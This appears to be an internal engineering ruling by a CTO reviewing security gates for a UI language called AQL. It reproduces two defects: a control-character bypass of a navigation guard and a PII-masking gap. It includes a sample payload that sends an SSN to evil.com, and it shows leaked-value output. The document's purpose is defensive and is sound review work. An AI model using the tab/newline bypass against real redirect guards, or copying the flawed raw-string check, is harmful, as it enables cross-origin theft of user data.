# CTO Ruling 2 — AQL 1.0 governance, English surface, AI-authoring

Date: 2026-07-10 · Ruling by: CTO · Method: verify by execution, cite file:line, paste real output.

## Headline

The gate prints `8 held · 0 OPEN`, exit 0. **That green is false.** I reproduced a
cross-origin exfiltration through `safeNavigate` and a raw-PII read through `buildScope`
in one line each. The gate exits 0 only because its G2 and G5 checks each probe exactly
one input and cannot fail for the classes that break. Per my standing ruling — *a test
that cannot fail is a lie; demand the negative control* — the gate does not yet prove what
it asserts.

**The mandate (OWNER'S RULING) is UNMET. No `state`, no `on:`, no action verb ships.**

Two mechanisms are genuinely valuable and mostly right (the navigate **allow-list
architecture**, the strip-before-scope **chokepoint idea**, the whole **English desugaring**,
the **AI eval instrument**). None is a REJECT. Two are REWORK on a named, reproduced defect.

---

## The two reproductions (my hands, not a designer's word)

### G5 — `safeNavigate` fails OPEN on a control char → cross-origin exfil

`safeNavigate` prefix-matches the **raw string** for "same-origin path" (`navigate.ts:75`,
regex `/^\/(?![/\\])/`) *before* it ever parses a URL. That regex excludes only `/` and `\`.
A leading `/` + TAB/LF/CR + `/host` slips through as "same origin" and is returned unchanged.
The WHATWG URL parser (i.e. every browser) strips TAB(0x09)/LF(0x0A)/CR(0x0D), collapsing
`/<TAB>/evil.com` into `//evil.com` — protocol-relative to an arbitrary host.

```
$ node -e 'safeNavigate("/\t/evil.com/steal?d=SSN", {allowHosts:["app.example.com"]})'
TAB  /\t/evil.com  => "/\t/evil.com/steal?d=SSN" | browser-resolves-to: https://evil.com/steal?d=SSN
LF   /\n/evil.com  => "/\n/evil.com/steal?d=SSN" | browser-resolves-to: https://evil.com/steal?d=SSN
CR   /\r/evil.com  => "/\r/evil.com/steal?d=SSN" | browser-resolves-to: https://evil.com/steal?d=SSN
```

A security guard that fails OPEN on a trivial input class is broken regardless of today's
reachability — and it is reachable: `navigate("/{{params.next}}")` with a control char in
`next`. The rest of `safeNavigate` is correct: `attacker.io` direct, userinfo
(`app.example.com@evil.com`), subdomain-suffix spoof (`app.example.com.attacker.io`),
protocol-relative `//host`, and `mailto:` all returned `null` in the same run. The defect is
narrow and the fix is known.

### G2 — `buildScope` masks only ONE shape; the inspector's node reads raw

`isDocumentShaped` (`scope.ts:48-52`) strips only values with `typeof version === 'number'
&& Array.isArray(root)`. Everything else is copied into the expression scope verbatim.

```
$ node -e '... buildScope(..., {canViewPii:false}) ...'
full {version:1,root} doc  : "•••••"          <- the ONLY shape the gate tests
raw scalar state.ssn       : "SSN 123-45-6789" <- LEAK
selected node.props.text   : "SSN 123-45-6789" <- LEAK  (the composer's inspector holds THIS)
string-version doc         : "SSN 123-45-6789" <- LEAK
node-array clipboard[0]    : "SSN 123-45-6789" <- LEAK
versionless {root} subtree : "SSN 123-45-6789" <- LEAK
```

The composer's inspector holds a **selected node** by definition (`{id,type,props,meta}` —
no `version`, no `root`). That is node-shaped, not document-shaped, so `buildScope` passes
its PII straight through. `scope.ts:5-6` claims "governance holds at the scope boundary and
nowhere else has to remember to" — that is false: the guarantee is conditional on an
**unbuilt** literal-only-state rule and a **spike-only** `documents` channel. This is exactly
the case the task names: *any design that lets an expression see the pre-strip document
breaks the product's only differentiator.*

### The gate cannot catch either

`governance-gate.mjs:35` defines `piiDoc = {version:1, root:[...]}` and the G2 check
(`:64`) feeds only that. G5 (`:98`) feeds only `https://attacker.io/?d=...`. No TAB/LF/CR,
no node-shaped state. A negative control is absent, so the gate is a false-green for the
broad invariants it prints.

---

## Satisfaction bar — item by item (evidence I ran)

| # | Bar | State | Evidence |
|---|-----|-------|----------|
| 1 | Runtime ⇄ compiler agree; conformance green, covers every new feature | **PARTIAL** | Compiler conformance: *21 documents render identically via runtime SSR and compiled TSX*, exit 0. But no new feature (state/on:/navigate/English) is landed in **either** — so nothing to cover yet. |
| 2 | Every new schema field round-trips `parse(serialize(doc))==doc` | **MET** (no new field) | atomkit regression suite green incl. "lossless serialize"; `resugar` deep-equals the real governed doc. No new schema field was added — trust boundary intact. |
| 3 | Expression evaluator fuzzed, cannot escape | **MET** | `expr tests passed (… prototype guards static+dynamic, no globals, DoS caps, … 4000-case fuzz, AST is pure data)`. |
| 4 | **Masked value unreachable from state, expressions, actions — proven by test** | **UNMET** | Reproduced above: `evalExpr("state.node.props.text", buildScope(...))` → raw SSN. `safeNavigate("/\t/evil.com/…")` → cross-origin. The masked value IS reachable. |
| 5 | Every important test has a demonstrated negative control | **UNMET** | Gate G2/G5 test one shape each and cannot fail for the break. (The AI harness and drift test DO carry negative controls — good.) |
| 6 | All repos build/test/CI green | **MET (today's surface)** | atomkit: 7 suites + typecheck exit 0. compiler: exit 0. governed-page canonical & english: 0 leaks (1422/2513 B). |
| 7 | Published surface intentional; no unversioned breaking change | **AT RISK** | `scope.ts`/`navigate.ts` untracked, `src/index.ts` modified (uncommitted WIP on 0.8.0); not exported, so published surface unchanged. The proposed `generate()` return-shape change is breaking and correctly **not** applied. |

Bars **4 and 5 are unmet.** Approving an unmet bar is the one unforgivable act. I do not.

---

## Rulings (per the six questions)

### 1. The gate — does it exit 0? Which held?
Exit 0, `8 held · 0 OPEN`. **The green is not trustworthy.** G2 and G6b/G7 aside, six gates
(G1, G3, G4, G6, G6b, G7) I accept as held; **G2 and G5 are false-greens.**
**Ruling: REWORK the gate.** Defect: it asserts broad invariants while probing one input
each — no negative control.
*Owner action:* Add the node-shaped/array/string-version state cases to G2 and the TAB/LF/CR
cases to G5, and treat the gate as 6 held / 2 OPEN until they pass.

### 2. Is G2 genuinely closed?
**No. REWORK.** Defect: `buildScope` (`scope.ts:48-52`) masks only `{version:number,
root:array}`; the composer's selected node, a node array, a string-version document, and a
raw governed scalar all read raw PII around the mask — and the general invariant depends on a
literal-only-state binder and a `documents` channel that exist **only as spike assertions**,
not in shipped atomkit or composer. The channel-separation *architecture* is the right answer
for the full document; the *primitive* and its *enforcement* are not there yet.
*Owner action:* Do not rely on structural document-detection — mask ctx-relative at every
leaf, or land the literal-only-state binder + documents channel in real code, then add the
node-shaped negative controls before asserting G2 held.

### 3. Is G5 genuinely closed?
**No. REWORK.** Defect: `safeNavigate` prefix-matches the raw string (`navigate.ts:75`)
before URL parsing, so `/<TAB|LF|CR>/host` is returned as same-origin and the browser
navigates cross-origin — fails OPEN. Verified separately that `attacker.io`, userinfo,
subdomain-spoof, `//host`, and `mailto:` are all blocked, so the allow-list design is sound.
*Owner action:* Stop pattern-matching the raw string — resolve `new URL(target, appOrigin)`,
allow only when `.origin === appOrigin` OR `.hostname` is allow-listed, fail closed on parse
error and on any WHATWG-stripped control char; add TAB/LF/CR negative controls to the gate.

### 4. Does English AQL preserve the invariants?
**APPROVE the desugaring, REWORK two claims.** The invariants hold: lossless serialize
round-trip (regression suite), 21-doc conformance green, strict schema unchanged,
`compilePage(desugar(english))` deep-equals `compilePage(canonical)` on the governed page
(0 leaks), `resugar` deep-equals the real doc, 25/25 language proofs, reserved interactivity
words refused. Defect: the "canonical is a fixed point / the two registers mix freely" claim
is **false** — `desugar` silently rewrites bare canonical style words (`bold`→`weight=700`)
and throws on a second quoted string that `compilePage` accepts, so
`compileEnglishPage(canonical) ≠ compilePage(canonical)` for real inputs.
*Owner action:* Scope the fixed-point claim to the governed page (what the test proves), and
make bare style words either pass through unchanged or raise a named error — never silently
rewrite, which is the exact silent-divergence class the design claims to kill.

### 5. Is the AI claim measured or asserted?
**APPROVE the instrument; REJECT the bundled unblock finding.** The harness plainly prints
`MODEL SUCCESS RATE: UNMEASURED`, self-checks pass, exit 0; the drift test has a load-bearing
negative control and exits 0 — honest and correct. But its bundled "MATERIAL FINDING" that
`8 held / 0 OPEN` **unblocks state/on:/navigate** is now false, because G2/G5 are false-green;
it must be retracted. Minor: the design says "only the leak gate catches" the forgot-pii
fixture — untrue, governance is the first failing gate.
*Owner action:* Keep the harness and the UNMEASURED banner; strike the "gate unblocks
interactivity" finding and wire a real `complete()` to produce the number before any AI-friendly
claim is published.

### 6. Ordering — what lands first, what is breaking, anything in only one implementation?
Correct today: **nothing interactive has landed in either implementation.** `buildScope`/
`safeNavigate` are zero-call-site runtime primitives (like `expr.ts`); English lives only in
composer/scratchpad spikes; the compiler is still 100% static (0 handlers/hooks, conformance
21/21). So the "one semantics, both implementations" rule is not yet violated.
The trap to gate against: when `navigate`/`state` ship, the guards must land in the **compiler
in the same change with conformance coverage** — and a statically-compiled page cannot do
per-viewer host-allow-listing, which is why this couples to ADR-009 (one ejected artifact per
persona). The `generate()` return-shape change is breaking and correctly deferred; it needs a
version plan and downstream coordination (app/http/compiler) before it lands.
*Owner action:* Make "lands in runtime AND compiler, with the conformance suite extended" a
merge gate for the first `navigate`/`state`/English feature — and never merge one implementation.

---

## Bottom line for the owner

The team did real work and disclosed most of its own gaps honestly. But the gate now claims
victory it did not earn on the two blocking gates, and that claim would greenlight the exact
interactivity the mandate forbids. **Hold the line: gate back to 2 OPEN, fix `safeNavigate`'s
control-char hole and `buildScope`'s shape-blindness with negative controls, land the
literal-only-state/documents-channel enforcement in real code — then, and only then, ship
`state`/`on:`/actions, in the runtime and the compiler together.**
